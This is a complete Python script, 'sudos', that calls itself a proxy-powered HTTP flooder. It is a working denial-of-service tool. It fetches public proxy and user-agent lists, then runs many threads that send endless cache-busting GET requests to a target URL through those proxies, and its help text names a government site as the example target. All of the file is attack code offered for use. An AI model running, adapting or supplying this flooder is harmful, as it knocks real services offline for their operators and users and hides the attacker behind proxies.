#!/usr/bin/env python
#version: beta-2.6

import threading
import argparse
import requests
import random
import string
import socket
import socks
import time
import ssl
import os

def urlsplit(url):
    protocol, url = url.split("://", 1)

    try:
        domain, path = url.split("/", 1)
    except Exception:
        path = ""
    
    try:
        domain, port = domain.split(":", 1)
    except Exception:
        port = None
    
    try:
        path, parameters = path.split("?", 1)
    except Exception:
        parameters = ""
    
    path = f"/{path}"
    if port == None:
        if protocol == "https":
            port = 443
        else:
            port = 80
    port = int(port)

    url_dict = {
        "protocol": protocol,
        "domain": domain,
        "port": port,
        "path": path,
        "parameters": parameters
    }

    return url_dict

def check_files():
    if not os.path.exists("./etc/"):
        os.mkdir("./etc/")
    if not os.path.exists("./etc/useragents.txt"):
        print("Info: Downloading useragents.txt")
        with open("./etc/useragents.txt", "a") as file:
            file.write(requests.get("https://raw.githubusercontent.com/lilmond/sudos/main/etc/useragents.txt").text)
            file.close()
    if not os.path.exists("./etc/proxies.txt"):
        print(f"Info: Downloading proxies.txt")
        download_proxy("./etc/proxies.txt")

def download_proxy(output_path):
    proxy_types = ["http", "socks4", "socks5"]
    proxy_list = []
    for proxy_type in proxy_types:
        while True:
            try:
                proxy_list += ([f"{proxy_type}://{proxy_address.strip()}" for item in requests.get(f"https://api.openproxy.space/lists/{proxy_type}").json()["data"] for proxy_address in item["items"]])
                break
            except Exception:
                print(f"Warning: Unable to download proxy list. Type: {proxy_type}. Retrying...")
                time.sleep(1)
    proxy_list.reverse()
    with open(output_path, "a") as file:
        file.write("\n".join(proxy_list).strip())
        file.close()

def randstr(length):
    return "".join(random.choices(list(string.ascii_letters + string.digits), k=length))

def main():
    options = argparse.ArgumentParser(prog="sudos", description="Proxy-powered HTTP flooder")
    options.add_argument("url", metavar="URL", help="Target full URL. Example: https://cia.gov/")
    options.add_argument("-t", "--thread", metavar="THREAD COUNT", default=100, type=int, help="Count of socket thread instances to be run")
    options.add_argument("--timeout", metavar="TIMEOUT", default=10, type=int, help="Socket connection timeout value")
    options.add_argument("--delay", metavar="DELAY", default=1, type=int, help="Sleep time value between HTTP requests")
    options.add_argument("--no-verify", action="store_true", help="Disable SSL verification")
    args = options.parse_args()

    if not any([args.url.startswith("http://"), args.url.startswith("https://")]):
        print("Warning: URL does not contain scheme part. Assuming it is HTTP...")
        args.url = f"http://{args.url}"
    
    try:
        check_files()
    except KeyboardInterrupt:
        return

    url_dict = urlsplit(args.url)
    domain_ip = socket.gethostbyname(url_dict["domain"])
    useragents = open("./etc/useragents.txt", "r").read().strip().splitlines()
    proxy_list = open("./etc/proxies.txt", "r").read().strip().splitlines()

    def _sudos(proxy):
        try:
            proxy_type, proxy_address = proxy.split("://", 1)
            proxy_host, proxy_port = proxy_address.split(":", 1)
            proxy_type = {"http": socks.PROXY_TYPE_HTTP, "socks4": socks.PROXY_TYPE_SOCKS4, "socks5": socks.PROXY_TYPE_SOCKS5}[proxy_type.lower()]
            
            sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            sock.set_proxy(proxy_type, proxy_host, int(proxy_port))
            sock.settimeout(args.timeout)
            sock.connect((domain_ip, url_dict["port"]))

            if url_dict["protocol"] == "https":
                ctx = ssl.create_default_context()
                if args.no_verify:
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=url_dict["domain"])
            
            params = url_dict["parameters"]
            if params:
                params = f"&{params}"

            while True:
                http_packet = f"GET {url_dict['path']}?{randstr(77)}{params} HTTP/1.1\r\nHost: {url_dict['domain']}\r\nUser-Agent: {random.choice(useragents)}\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\n\r\n"
                sock.send(http_packet.encode())
                time.sleep(args.delay)
        except Exception:
            return

    def _sudos_runner():
        while True:
            for proxy in proxy_list:
                while True:
                    if (threading.active_count() - 2) >= args.thread:
                        time.sleep(0.1)
                        continue
                    threading.Thread(target=_sudos, args=[proxy], daemon=True).start()
                    break
    
    threading.Thread(target=_sudos_runner, daemon=True).start()

    while True:
        try:
            active_threads = threading.active_count() - 2
            print(f"Active Threads: {active_threads}")
            time.sleep(1)
        except KeyboardInterrupt:
            exit()

if __name__ == "__main__":
    main()
